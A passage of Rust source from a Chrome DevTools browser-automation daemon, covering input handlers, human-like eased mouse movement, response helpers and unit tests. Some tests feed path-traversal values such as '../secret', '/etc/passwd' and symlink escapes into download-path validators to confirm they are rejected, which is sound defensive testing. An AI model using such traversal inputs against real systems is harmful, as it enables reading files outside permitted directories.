    let params = build_mouse_event_params(
        &mut mouse_state,
        event_type,
        cmd.get("x").and_then(|v| v.as_f64()),
        cmd.get("y").and_then(|v| v.as_f64()),
        cmd.get("button").and_then(|v| v.as_str()),
        cmd.get("buttons")
            .and_then(|v| v.as_i64())
            .map(|v| v as i32),
        cmd.get("clickCount")
            .and_then(|v| v.as_i64())
            .map(|v| v as i32),
        cmd.get("deltaX").and_then(|v| v.as_f64()),
        cmd.get("deltaY").and_then(|v| v.as_f64()),
        cmd.get("modifiers")
            .and_then(|v| v.as_i64())
            .map(|v| v as i32),
    );

    mgr.client
        .send_command_typed::<_, Value>("Input.dispatchMouseEvent", &params, Some(&session_id))
        .await?;
    state.mouse_state = mouse_state;
    if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
        cursor.record(mouse_state.x, mouse_state.y, mouse_state.buttons);
    }
    Ok(json!({ "dispatched": event_type }))
}

async fn handle_input_keyboard(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let event_type = cmd
        .get("type")
        .and_then(|v| v.as_str())
        .unwrap_or("keyDown");

    let mut params = json!({ "type": event_type });
    for key in &["key", "code", "text"] {
        if let Some(v) = cmd.get(*key) {
            params[*key] = v.clone();
        }
    }

    mgr.client
        .send_command("Input.dispatchKeyEvent", Some(params), Some(&session_id))
        .await?;
    Ok(json!({ "dispatched": event_type }))
}

async fn handle_input_touch(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let event_type = cmd
        .get("type")
        .and_then(|v| v.as_str())
        .unwrap_or("touchStart");

    mgr.client
        .send_command(
            "Input.dispatchTouchEvent",
            Some(json!({
                "type": event_type,
                "touchPoints": cmd.get("touchPoints").unwrap_or(&json!([])),
            })),
            Some(&session_id),
        )
        .await?;
    Ok(json!({ "dispatched": event_type }))
}

async fn handle_keydown(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let key = cmd
        .get("key")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'key' parameter")?;

    mgr.client
        .send_command(
            "Input.dispatchKeyEvent",
            Some(json!({ "type": "keyDown", "key": key })),
            Some(&session_id),
        )
        .await?;
    Ok(json!({ "keydown": key }))
}

async fn handle_keyup(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let key = cmd
        .get("key")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'key' parameter")?;

    mgr.client
        .send_command(
            "Input.dispatchKeyEvent",
            Some(json!({ "type": "keyUp", "key": key })),
            Some(&session_id),
        )
        .await?;
    Ok(json!({ "keyup": key }))
}

async fn handle_inserttext(cmd: &Value, state: &DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let text = cmd
        .get("text")
        .and_then(|v| v.as_str())
        .ok_or("Missing 'text' parameter")?;

    mgr.client
        .send_command(
            "Input.insertText",
            Some(json!({ "text": text })),
            Some(&session_id),
        )
        .await?;
    Ok(json!({ "inserted": true }))
}

/// Move the session cursor along a deterministic eased curve. Human mode adds
/// a seeded perpendicular bend and samples the path frequently enough for
/// animation-heavy pages while preserving exact, reproducible endpoints.
/// Schedule steps against one clock so Chrome's response time counts toward
/// the requested duration instead of being added to every step's delay.
#[allow(clippy::too_many_arguments)]
async fn move_mouse_interpolated(
    client: &CdpClient,
    session_id: &str,
    mouse_state: &mut MouseState,
    target_x: f64,
    target_y: f64,
    duration_ms: u64,
    requested_steps: Option<usize>,
    human: bool,
    seed: u64,
    buttons: i32,
    viewport_offset: (f64, f64),
    recording_cursor: &recording::SharedRecordingCursor,
) -> Result<(), String> {
    // Cursor state stays in page coordinates even when dispatching to an OOPIF.
    let start_x = mouse_state.x - viewport_offset.0;
    let start_y = mouse_state.y - viewport_offset.1;
    let dx = target_x - start_x;
    let dy = target_y - start_y;
    let distance = dx.hypot(dy);
    let duration_ms = if duration_ms == 0 && human {
        (80.0 + distance * 0.35).clamp(100.0, 700.0) as u64
    } else {
        duration_ms
    };
    let steps = interpolated_mouse_steps(distance, duration_ms, requested_steps, human);
    let bend = if human && distance > 0.0 {
        let mixed = seed
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        let unit = ((mixed >> 11) as f64) / ((1_u64 << 53) as f64);
        (unit * 2.0 - 1.0) * (distance * 0.08).min(36.0)
    } else {
        0.0
    };
    let (perp_x, perp_y) = if distance > 0.0 {
        (-dy / distance, dx / distance)
    } else {
        (0.0, 0.0)
    };
    let schedule = if duration_ms == 0 {
        None
    } else {
        Some((
            tokio::time::Instant::now(),
            tokio::time::Duration::from_millis(duration_ms),
        ))
    };

    for i in 1..=steps {
        let (x, y) = interpolated_mouse_point(
            start_x, start_y, target_x, target_y, perp_x, perp_y, bend, i, steps,
        );
        let params = build_mouse_event_params(
            mouse_state,
            "mouseMoved",
            Some(x),
            Some(y),
            None,
            Some(buttons),
            None,
            None,
            None,
            None,
        );
        client
            .send_command_typed::<_, Value>("Input.dispatchMouseEvent", &params, Some(session_id))
            .await?;
        mouse_state.x = x + viewport_offset.0;
        mouse_state.y = y + viewport_offset.1;
        if let Ok(mut cursor) = recording_cursor.lock() {
            cursor.record(mouse_state.x, mouse_state.y, buttons);
        }
        if let Some((started, duration)) = schedule {
            tokio::time::sleep_until(started + duration.mul_f64(i as f64 / steps as f64)).await;
        }
    }
    Ok(())
}

fn interpolated_mouse_steps(
    distance: f64,
    duration_ms: u64,
    requested_steps: Option<usize>,
    human: bool,
) -> usize {
    requested_steps
        .unwrap_or_else(|| {
            let spatial_steps = ((distance / 12.0).ceil() as usize).clamp(1, 60);
            if human && duration_ms > 0 {
                spatial_steps.max(duration_ms.div_ceil(16) as usize)
            } else {
                spatial_steps
            }
        })
        .clamp(1, 240)
}

#[allow(clippy::too_many_arguments)]
fn interpolated_mouse_point(
    start_x: f64,
    start_y: f64,
    target_x: f64,
    target_y: f64,
    perp_x: f64,
    perp_y: f64,
    bend: f64,
    step: usize,
    steps: usize,
) -> (f64, f64) {
    if step == steps {
        return (target_x, target_y);
    }
    let t = step as f64 / steps as f64;
    let eased = t * t * (3.0 - 2.0 * t);
    let curve = 4.0 * t * (1.0 - t) * bend;
    (
        start_x + (target_x - start_x) * eased + perp_x * curve,
        start_y + (target_y - start_y) * eased + perp_y * curve,
    )
}

async fn handle_mousemove(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let x = cmd.get("x").and_then(|v| v.as_f64()).unwrap_or(0.0);
    let y = cmd.get("y").and_then(|v| v.as_f64()).unwrap_or(0.0);
    let duration = cmd.get("duration").and_then(Value::as_u64).unwrap_or(0);
    let mut steps = cmd.get("steps").and_then(Value::as_u64).map(|v| v as usize);
    let mode = cmd
        .get("inputMode")
        .and_then(Value::as_str)
        .unwrap_or(&state.input_mode);
    let human = mode == "human";
    if mode == "instant" && duration == 0 && steps.is_none() {
        steps = Some(1);
    }
    let seed = cmd.get("seed").and_then(Value::as_u64).unwrap_or(0);
    let buttons = state.mouse_state.buttons;
    move_mouse_interpolated(
        &mgr.client,
        &session_id,
        &mut state.mouse_state,
        x,
        y,
        duration,
        steps,
        human,
        seed,
        buttons,
        (0.0, 0.0),
        &state.recording_state.shared_cursor,
    )
    .await?;
    Ok(json!({ "moved": true, "x": x, "y": y }))
}

async fn handle_mousedown(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let button = cmd.get("button").and_then(|v| v.as_str()).unwrap_or("left");
    let params = build_mouse_event_params(
        &mut state.mouse_state,
        "mousePressed",
        None,
        None,
        Some(button),
        None,
        Some(1),
        None,
        None,
        None,
    );

    mgr.client
        .send_command_typed::<_, Value>("Input.dispatchMouseEvent", &params, Some(&session_id))
        .await?;
    if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
        cursor.record(
            state.mouse_state.x,
            state.mouse_state.y,
            state.mouse_state.buttons,
        );
    }
    Ok(json!({ "pressed": true }))
}

async fn handle_mouseup(cmd: &Value, state: &mut DaemonState) -> Result<Value, String> {
    let mgr = state.browser.as_ref().ok_or("Browser not launched")?;
    let session_id = mgr.active_session_id()?.to_string();
    let button = cmd.get("button").and_then(|v| v.as_str()).unwrap_or("left");
    let params = build_mouse_event_params(
        &mut state.mouse_state,
        "mouseReleased",
        None,
        None,
        Some(button),
        None,
        Some(1),
        None,
        None,
        None,
    );

    mgr.client
        .send_command_typed::<_, Value>("Input.dispatchMouseEvent", &params, Some(&session_id))
        .await?;
    if let Ok(mut cursor) = state.recording_state.shared_cursor.lock() {
        cursor.record(
            state.mouse_state.x,
            state.mouse_state.y,
            state.mouse_state.buttons,
        );
    }
    Ok(json!({ "released": true }))
}

// ---------------------------------------------------------------------------
// Response helpers
// ---------------------------------------------------------------------------

fn success_response(id: &str, data: Value) -> Value {
    json!({
        "id": id,
        "success": true,
        "data": data,
    })
}

/// Enrich ordinary browser results so discovery does not depend on the agent
/// remembering to call `webmcp list`. Administrative commands stay page-free.
fn includes_webmcp_context(action: &str) -> bool {
    action != "webmcp_list"
        && (!skip_launch_action(action)
            || matches!(action, "launch" | "webmcp_result" | "webmcp_cancel"))
}

async fn attach_webmcp_availability(resp: &mut Value, action: &str, state: &mut DaemonState) {
    if !includes_webmcp_context(action)
        || matches!(state.backend_type, BackendType::WebDriver)
        || state.engine != "chrome"
        || !state.webmcp_enabled
        || state.browser.is_none()
    {
        return;
    }
    // The first subscription is bounded. Once installed, observation is passive
    // and the dispatcher already drains CDP events after every browser action.
    let initializing = state
        .browser
        .as_ref()
        .and_then(|b| b.active_session_id().ok())
        .is_some_and(|session| !state.webmcp.observations.contains_key(session));
    let observed = enable_webmcp_events(state).await;
    let drained = if initializing {
        state.drain_cdp_events_background().await
    } else {
        Ok(())
    };
    let session = state
        .browser
        .as_ref()
        .and_then(|b| b.active_session_id().ok())
        .map(str::to_string);
    if let Some(session) = session {
        if observed.is_ok() && drained.is_ok() {
            if let Ok(tools) = state.webmcp.tools(&session) {
                let filter = state.domain_filter.read().await;
                attach_webmcp_availability_from_tools(
                    resp,
                    action,
                    &tools,
                    filter.as_ref(),
                    &mut state.webmcp,
                    &session,
                );
                return;
            }
        }
    }
    if let Some(context) = state.webmcp.context_unavailable() {
        insert_webmcp_context(resp, context);
    }
}

fn attach_webmcp_availability_from_tools(
    resp: &mut Value,
    action: &str,
    tools: &[webmcp::ToolRecord],
    domain_filter: Option<&DomainFilter>,
    runtime: &mut webmcp::RuntimeState,
    session: &str,
) {
    if !includes_webmcp_context(action) {
        return;
    }
    let allowed: Vec<_> = tools
        .iter()
        .filter(|tool| domain_filter.is_none_or(|filter| filter.check_url(&tool.origin).is_ok()))
        .cloned()
        .collect();
    if let Some(context) = runtime.context_update(session, &allowed) {
        insert_webmcp_context(resp, context);
    }
}

fn insert_webmcp_context(resp: &mut Value, context: Value) {
    let Some(response) = resp.as_object_mut() else {
        return;
    };
    let data = response.entry("data").or_insert_with(|| json!({}));
    if let Some(data) = data.as_object_mut() {
        data.insert("webmcp".to_string(), context);
    }
}

fn inject_lifecycle(
    resp: &mut Value,
    state: &DaemonState,
    reused: bool,
    launched: bool,
    relaunched_browser: bool,
) {
    if resp.get("success").and_then(|v| v.as_bool()) != Some(true) {
        return;
    }

    let Some(data) = resp.get_mut("data") else {
        return;
    };
    let Some(obj) = data.as_object_mut() else {
        return;
    };

    let data_reused = obj.get("reused").and_then(|v| v.as_bool()).unwrap_or(false);
    let data_launched = obj
        .get("launched")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let data_relaunched = obj
        .get("relaunchedBrowser")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let effective_reused = reused || data_reused;
    let effective_launched = launched || data_launched;
    let effective_relaunched = relaunched_browser || data_relaunched;

    obj.insert(
        "lifecycle".to_string(),
        json!({
            "reused": effective_reused,
            "launched": effective_launched,
            "relaunchedBrowser": effective_relaunched,
            "restartedBackground": false,
            "restoreStatus": state.restore_status,
            "saveStatus": state.restore_save_status,
            "effectiveLaunch": {
                "browserLaunched": state.browser.is_some(),
                "engine": state.engine,
                "launchHash": state.launch_identity,
            }
        }),
    );
}

fn error_response(id: &str, error: &str) -> Value {
    let mut resp = json!({
        "id": id,
        "success": false,
        "error": error,
    });
    // Machine-readable code for "the bound tab no longer exists" so scripts
    // using --json can match on it instead of parsing the message.
    if error.starts_with(super::browser::TAB_GONE_PREFIX) {
        resp["code"] = json!("tab_gone");
    } else if error.starts_with(super::browser::PAGE_WEDGED_PREFIX) {
        resp["code"] = json!("page_wedged");
    } else if let Some((code, _)) = error.split_once(": ") {
        if code.starts_with("webmcp_") {
            resp["code"] = json!(code);
        }
    }
    resp
}

fn attach_tab_gone_data(resp: &mut Value, state: &DaemonState) {
    if resp.get("code").and_then(Value::as_str) != Some("tab_gone") {
        return;
    }
    let Some((target_id, last_url)) = state
        .browser
        .as_ref()
        .and_then(BrowserManager::bound_target_gone_details)
    else {
        return;
    };

    let mut data = json!({ "targetId": target_id });
    if !last_url.is_empty() {
        data["lastUrl"] = json!(last_url);
    }
    resp["data"] = data;
}

#[cfg(test)]
mod tests {
    /// Serves `Browser.getVersion` on one fixed `ws://` address for any number
    /// of connections and counts the calls.
    async fn version_server() -> (String, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
        use futures_util::{SinkExt, StreamExt};
        use tokio_tungstenite::tungstenite::Message;
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let url = format!("ws://{}", listener.local_addr().unwrap());
        let calls = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let served = calls.clone();
        tokio::spawn(async move {
            while let Ok((stream, _)) = listener.accept().await {
                let calls = served.clone();
                tokio::spawn(async move {
                    let Ok(mut ws) = tokio_tungstenite::accept_async(stream).await else {
                        return;
                    };
                    while let Some(Ok(Message::Text(text))) = ws.next().await {
                        let request: serde_json::Value = serde_json::from_str(&text).unwrap();
                        if request["method"] == "Browser.getVersion" {
                            calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
                        }
                        let reply = serde_json::json!({
                            "id": request["id"],
                            "result": { "product": "Chrome/1.0.0.0" },
                        });
                        if ws
                            .send(Message::Text(reply.to_string().into()))
                            .await
                            .is_err()
                        {
                            return;
                        }
                    }
                });
            }
        });
        (url, calls)
    }

    #[tokio::test]
    async fn outdated_check_reads_the_product_once_per_connection() {
        let (url, calls) = version_server().await;
        let mut state = super::DaemonState::new();
        let mut response = serde_json::json!({});

        let client = crate::native::cdp::client::CdpClient::connect(&url)
            .await
            .unwrap();
        state.browser = Some(super::BrowserManager::for_test(client, url.clone()));
        super::warn_if_browser_outdated(&mut state, &mut response).await;
        super::warn_if_browser_outdated(&mut state, &mut response).await;
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);

        let client = crate::native::cdp::client::CdpClient::connect(&url)
            .await
            .unwrap();
        state.browser = Some(super::BrowserManager::for_test(client, url.clone()));
        super::warn_if_browser_outdated(&mut state, &mut response).await;
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn cdp_url_without_browser_does_not_launch() {
        let mut state = super::DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;

        let response = super::execute_command(
            &serde_json::json!({ "id": "cdp", "action": "cdp_url" }),
            &mut state,
        )
        .await;

        assert_eq!(response["success"], false);
        assert_eq!(response["error"], "Browser not launched");
        assert!(state.browser.is_none());
    }

    #[tokio::test]
    async fn a_replay_over_a_har_without_content_captures_bodies_and_restores_the_mode() {
        use crate::native::flow::Browser;
        let mut state = DaemonState::new();
        state.har_recording = true;
        state.har_content_mode = HarContentMode::None;
        let allow = crate::native::flow::AllowWrite::default();
        let mut wiring = FlowWiring::new(&mut state, &allow);
        wiring.begin_capture().await.unwrap();
        assert_eq!(
            wiring.state.har_content_mode,
            HarContentMode::Text,
            "the replay needs bodies to read its answers"
        );
        wiring.end_capture().await;
        assert_eq!(state.har_content_mode, HarContentMode::None);
        assert!(state.har_recording, "the user's HAR keeps running");
    }

    #[tokio::test]
    async fn a_replay_leaves_no_bodies_on_the_entries_a_content_none_har_held_before_it() {
        use crate::native::flow::Browser;
        let entry = |id: &str, body: Option<&str>| HarEntry {
            request_id: id.to_string(),
            wall_time: 0.0,
            method: "GET".to_string(),
            url: "https://example.com/".to_string(),
            request_headers: Vec::new(),
            post_data: None,
            request_body_size: 0,
            resource_type: "Fetch".to_string(),
            status: Some(200),
            status_text: "OK".to_string(),
            http_version: "HTTP/2.0".to_string(),
            response_headers: Vec::new(),
            mime_type: "application/json".to_string(),
            redirect_url: String::new(),
            response_body_size: 2,
            cdp_timing: None,
            loading_finished_timestamp: Some(1.0),
            response_body: body.map(String::from),
            response_body_base64: false,
            remote_addr: None,
        };
        let mut state = DaemonState::new();
        state.har_recording = true;
        state.har_content_mode = HarContentMode::None;
        state.har_entries.push(entry("before", None));
        let allow = crate::native::flow::AllowWrite::default();
        let mut wiring = FlowWiring::new(&mut state, &allow);
        let mark = wiring.begin_capture().await.unwrap();
        // A body fetched while the replay ran, for a request that began earlier.
        wiring.state.har_entries[0].response_body = Some("{}".to_string());
        wiring.state.har_body_total_bytes = 2;
        wiring.state.har_entries.push(entry("during", Some("{}")));
        assert_eq!(mark, 1);
        wiring.end_capture().await;
        assert_eq!(state.har_entries.len(), 1);
        assert_eq!(state.har_entries[0].response_body, None);
        assert_eq!(state.har_body_total_bytes, 0);
    }

    #[test]
    fn wedged_tab_replacement_follows_tab_policy() {
        let dir = tempfile::tempdir().unwrap();
        let policy_with = |body: &str| {
            let path = dir.path().join("policy.json");
            std::fs::write(&path, body).unwrap();
            ActionPolicy::load(path.to_str().unwrap()).unwrap()
        };
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        assert!(may_replace_wedged_tab(&state));

        state.policy = Some(policy_with(r#"{"default":"allow","deny":["tab_close"]}"#));
        assert!(!may_replace_wedged_tab(&state));

        state.policy = Some(policy_with(r#"{"default":"allow","confirm":["tab_new"]}"#));
        assert!(!may_replace_wedged_tab(&state));
        state.confirmed_policy_actions.insert("tab_new".to_string());
        assert!(may_replace_wedged_tab(&state));

        state.policy = None;
        state.confirmed_policy_actions.clear();
        state.confirm_actions = Some(ConfirmActions {
            categories: ["tab_close".to_string()].into_iter().collect(),
        });
        assert!(!may_replace_wedged_tab(&state));
    }

    #[test]
    fn wedge_report_delivered_only_clears_its_own_request() {
        let mut state = DaemonState::new();
        let report = || super::super::browser::WedgeReport {
            target_id: "T".to_string(),
            session_id: "S".to_string(),
            last_url: String::new(),
            replacement_target_id: None,
            kept: false,
        };
        state.undelivered_wedge = Some(("b".to_string(), report()));
        state.wedge_report_delivered("a");
        assert!(state.undelivered_wedge.is_some());
        state.wedge_report_delivered("b");
        assert!(state.undelivered_wedge.is_none());
    }

    #[test]
    fn only_a_launched_browser_may_name_the_file_to_move() {
        let dir = tempfile::tempdir().unwrap();
        let downloads = dir.path().join("downloads");
        std::fs::create_dir(&downloads).unwrap();
        let inside = downloads.join("report.bin");
        let outside = dir.path().join("secret");
        std::fs::write(&inside, "").unwrap();
        std::fs::write(&outside, "").unwrap();
        let downloads = downloads.to_str();

        assert!(!super::may_move_download(&inside, false, None));
        assert!(!super::may_move_download(&inside, false, downloads));
        assert!(super::may_move_download(&outside, true, None));
        assert!(super::may_move_download(&inside, true, downloads));
        assert!(!super::may_move_download(&outside, true, downloads));
        let escape = dir.path().join("downloads").join("..").join("secret");
        assert!(!super::may_move_download(&escape, true, downloads));
        #[cfg(unix)]
        {
            let link = dir.path().join("downloads").join("link");
            std::os::unix::fs::symlink(&outside, &link).unwrap();
            assert!(!super::may_move_download(&link, true, downloads));
        }
    }

    #[test]
    fn download_guid_must_name_a_file_in_the_download_dir() {
        let dir = std::path::Path::new("/tmp/downloads");
        assert_eq!(
            super::guid_download_path(dir, "8f3c-21ab").unwrap(),
            dir.join("8f3c-21ab")
        );
        for guid in ["", ".", "..", "../secret", "a/b", "/etc/passwd", "8f3c/"] {
            assert!(
                super::guid_download_path(dir, guid).is_err(),
                "accepted {guid:?}"
            );
        }
    }

    #[tokio::test]
    #[ignore = "requires Chrome"]
    async fn e2e_attached_download_fails_before_browser_or_filesystem_changes() {
        let mut producer = super::BrowserManager::launch(super::LaunchOptions::default(), None)
            .await
            .unwrap();
        let mut state = super::DaemonState::new();
        state.browser = Some(
            super::BrowserManager::connect_cdp(producer.get_cdp_url())
                .await
                .unwrap(),
        );
        let dir = tempfile::tempdir().unwrap();
        let destination = dir.path().join("new-directory").join("output.bin");

        let error = super::handle_download(
            &serde_json::json!({ "selector": "#dl", "path": destination }),
            &mut state,
        )
        .await
        .unwrap_err();
        assert!(error.contains("--cdp"), "{error}");
        assert!(!destination.parent().unwrap().exists());
        let _ = producer.close().await;
    }

    async fn start_finished_download(
        state: &mut super::DaemonState,
        download_dir: &std::path::Path,
    ) -> std::path::PathBuf {
        for cmd in [
            serde_json::json!({ "id": "1", "action": "launch", "headless": true,
                "downloadPath": download_dir.to_string_lossy() }),
            serde_json::json!({ "id": "2", "action": "navigate", "url":
                "data:text/html,<a id=dl download=report.bin href='data:application/octet-stream,report'>dl</a>" }),
            serde_json::json!({ "id": "3", "action": "evaluate",
                "script": "document.getElementById('dl').click()" }),
        ] {
            let resp = super::execute_command(&cmd, state).await;
            assert_eq!(resp["success"], true, "{resp}");
        }
        let saved = download_dir.join("report.bin");
        for _ in 0..50 {
            if saved.exists() {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }
        assert!(
            saved.exists(),
            "download should land in the configured directory"
        );
        saved
    }

    /// Events that arrive after the per-command drain, for example during the
    /// liveness check, are still in the daemon's receiver when the wait starts.
    #[tokio::test]
    #[ignore]
    async fn e2e_wait_download_claims_a_completion_left_in_the_daemon_receiver() {
        let dir = tempfile::tempdir().unwrap();
        let mut state = super::DaemonState::new();
        start_finished_download(&mut state, &dir.path().join("downloads")).await;

        let result = super::handle_waitfordownload(
            &serde_json::json!({ "action": "waitfordownload", "timeout": 2000 }),
            &mut state,
        )
        .await;
        assert!(result.is_ok(), "{result:?}");
        super::execute_command(
            &serde_json::json!({ "id": "9", "action": "close" }),
            &mut state,
        )
        .await;
    }

    #[tokio::test]
    #[ignore]
    async fn e2e_wait_download_failed_move_leaves_the_download_claimable() {
        let dir = tempfile::tempdir().unwrap();
        let mut state = super::DaemonState::new();
        let saved = start_finished_download(&mut state, &dir.path().join("downloads")).await;

        // A regular file as the parent directory makes the destination invalid.
        let blocker = dir.path().join("blocker");
        std::fs::write(&blocker, "").unwrap();
        let resp = super::execute_command(
            &serde_json::json!({ "id": "4", "action": "waitfordownload",
                "path": blocker.join("report.bin").to_string_lossy(), "timeout": 2000 }),
            &mut state,
        )
        .await;
        assert_eq!(resp["success"], false, "{resp}");
        assert!(saved.exists(), "a failed move keeps the source file");

        let dest = dir.path().join("out").join("report.bin");
        let resp = super::execute_command(
            &serde_json::json!({ "id": "5", "action": "waitfordownload",
                "path": dest.to_string_lossy(), "timeout": 2000 }),
            &mut state,
        )
        .await;
        assert_eq!(resp["success"], true, "{resp}");
        assert_eq!(std::fs::read_to_string(&dest).unwrap(), "report");
        super::execute_command(
            &serde_json::json!({ "id": "9", "action": "close" }),
            &mut state,
        )
        .await;
    }

    /// `download` points the browser at another directory; later downloads must
    /// go back to the configured one so `wait --download` can still move them.
    #[tokio::test]
    #[ignore]
    async fn e2e_wait_download_after_download_command_uses_configured_dir() {
        let dir = tempfile::tempdir().unwrap();
        let mut state = super::DaemonState::new();
        start_finished_download(&mut state, &dir.path().join("downloads")).await;
        let claimed = super::execute_command(
            &serde_json::json!({ "id": "4", "action": "waitfordownload", "timeout": 2000 }),
            &mut state,
        )
        .await;
        assert_eq!(claimed["success"], true, "{claimed}");

        let resp = super::execute_command(
            &serde_json::json!({ "id": "5", "action": "download", "selector": "#dl",
                "path": dir.path().join("other").join("first.bin").to_string_lossy() }),
            &mut state,
        )
        .await;
        assert_eq!(resp["success"], true, "{resp}");
        let resp = super::execute_command(
            &serde_json::json!({ "id": "6", "action": "evaluate",
                "script": "document.getElementById('dl').click()" }),
            &mut state,
        )
        .await;
        assert_eq!(resp["success"], true, "{resp}");

        let dest = dir.path().join("out").join("second.bin");
        let resp = super::execute_command(
            &serde_json::json!({ "id": "7", "action": "waitfordownload",
                "path": dest.to_string_lossy(), "timeout": 5000 }),
            &mut state,
        )
        .await;
        assert_eq!(resp["success"], true, "{resp}");
        assert_eq!(std::fs::read_to_string(&dest).unwrap(), "report");
        super::execute_command(
            &serde_json::json!({ "id": "9", "action": "close" }),
            &mut state,
        )
        .await;
    }

    /// Connecting over CDP must not reset the attached browser's download
    /// directory, and the wait must not require the file on the local disk.
    #[tokio::test]
    #[ignore]
    async fn e2e_cdp_connect_keeps_the_browser_download_dir() {
        let dir = tempfile::tempdir().unwrap();
        let download_dir = dir.path().join("downloads");
        std::fs::create_dir_all(&download_dir).unwrap();
        let mut owner = super::DaemonState::new();
        for cmd in [
            serde_json::json!({ "id": "1", "action": "launch", "headless": true,
                "downloadPath": download_dir.to_string_lossy() }),
            serde_json::json!({ "id": "2", "action": "navigate", "url":
                "data:text/html,<a id=dl download=report.bin href='data:application/octet-stream,report'>dl</a>" }),
        ] {
            let resp = super::execute_command(&cmd, &mut owner).await;
            assert_eq!(resp["success"], true, "{resp}");
        }
        let cdp_url = owner.browser.as_ref().unwrap().get_cdp_url().to_string();

        let mut attached = super::DaemonState::new();
        for cmd in [
            serde_json::json!({ "id": "3", "action": "launch", "cdpUrl": cdp_url }),
            serde_json::json!({ "id": "4", "action": "evaluate",
                "script": "document.getElementById('dl').click()" }),
        ] {
            let resp = super::execute_command(&cmd, &mut attached).await;
            assert_eq!(resp["success"], true, "{resp}");
        }
        let resp = super::execute_command(
            &serde_json::json!({ "id": "5", "action": "waitfordownload", "timeout": 5000 }),
            &mut attached,
        )
        .await;
        assert_eq!(resp["success"], true, "{resp}");
        let saved = download_dir.join("report.bin");
        for _ in 0..50 {
            if saved.exists() {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }
        assert!(
            saved.exists(),
            "download should stay in the configured directory"
        );
        super::execute_command(
            &serde_json::json!({ "id": "9", "action": "close" }),
            &mut owner,
        )
        .await;
    }

    #[tokio::test]
    async fn test_auth_login_releases_remote_objects_after_failures() {
        use futures_util::{SinkExt, StreamExt};
        use tokio_tungstenite::tungstenite::Message;

        for failure in ["selection", "describe", "fill-exception", "fill-protocol"] {
            let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
            let url = format!("ws://{}", listener.local_addr().unwrap());
            let server = tokio::spawn(async move {
                let (stream, _) = listener.accept().await.unwrap();
                let mut ws = tokio_tungstenite::accept_async(stream).await.unwrap();
                let mut releases = Vec::new();
                let mut attempts = 0;
                while let Some(Ok(Message::Text(text))) = ws.next().await {
                    let request: Value = serde_json::from_str(&text).unwrap();
                    let mut response = json!({ "id": request["id"] });
                    response["result"] = match request["method"].as_str().unwrap() {
                        "Runtime.evaluate" => {
                            attempts += 1;
                            if failure == "selection" && attempts == 1 {
                                json!({
                                    "result": { "type": "object", "objectId": "rejected-result" },
                                    "exceptionDetails": { "text": "Invalid selector",
                                        "exception": { "type": "object", "objectId": "exception" } }
                                })
                            } else {
                                json!({ "result": { "type": "object", "subtype": "node",
                                    "objectId": format!("node-{attempts}") } })
                            }
                        }
                        "DOM.describeNode" if failure == "describe" && attempts == 1 => {
                            response["error"] =
                                json!({ "code": -32000, "message": "Node unavailable" });
                            Value::Null
                        }
                        "DOM.describeNode" => json!({ "node": { "backendNodeId": 42 } }),
                        "DOM.resolveNode" => {
                            json!({ "object": { "type": "object", "objectId": "login-node" } })
                        }
                        "Runtime.callFunctionOn" if failure == "fill-exception" => json!({
                            "result": { "type": "object", "objectId": "rejected-result" },
                            "exceptionDetails": { "text": "Page exception",
                                "exception": { "type": "object", "objectId": "exception" } }
                        }),
                        "Runtime.callFunctionOn" if failure == "fill-protocol" => {
                            response["error"] = json!({ "code": -32000, "message": "CDP failure" });
                            Value::Null
                        }
                        "Runtime.callFunctionOn" => {
                            json!({ "result": { "type": "boolean", "value": true } })
                        }
                        "Runtime.releaseObject" => {
                            releases
                                .push(request["params"]["objectId"].as_str().unwrap().to_string());
                            json!({})
                        }
                        other => panic!("Unexpected command: {other}"),
                    };
                    ws.send(Message::Text(response.to_string())).await.unwrap();
                }
                (attempts, releases)
            });
            let client = CdpClient::connect(&url).await.unwrap();
            let element = super::wait_for_any_selector(&client, "session", &["input"], 1_000)
                .await
                .unwrap();
            let filled = element.fill(&client, "session", "test-value").await;
            client.close().await;
            let (attempts, mut releases) = server.await.unwrap();
            assert_eq!(filled.is_ok(), !failure.starts_with("fill"), "{failure}");
            assert_eq!(attempts, if failure.starts_with("fill") { 1 } else { 2 });
            let mut expected = match failure {
                "selection" => vec!["exception", "rejected-result", "node-2", "login-node"],
                "describe" => vec!["node-1", "node-2", "login-node"],
                "fill-exception" => vec!["node-1", "rejected-result", "exception", "login-node"],
                _ => vec!["node-1", "login-node"],
            };
